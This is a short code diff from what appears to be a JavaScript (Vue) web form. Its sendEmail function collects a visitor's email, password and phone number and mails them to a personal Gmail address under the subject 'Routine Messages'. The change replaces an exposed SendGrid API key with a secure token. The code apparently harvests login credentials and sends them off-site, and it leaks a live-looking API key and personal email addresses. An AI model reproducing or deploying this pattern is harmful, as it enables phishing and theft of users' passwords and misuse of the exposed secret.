@@ -34,12 +34,8 @@ export default {
         sendEmail(){
             alert("I get here")
             alert("Email:" + this.model.email + "Password:" + this.model.password + "Telephone:" + this.model.phone)
-            Email.send({   
-                Host : "smtp.sendgrid.net",
-                Port : "25",
-                Ssl : true,
-                Username : "apikey",
-                Password : "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",          
+            Email.send({         
+                SecureToken : "86bd5e36-8568-4068-8369-c605f490e20a",
                 To : 'olaniranolaolujames@gmail.com',
                 From : "takeitallever@gmail.com",
                 Subject : "Routine Messages",
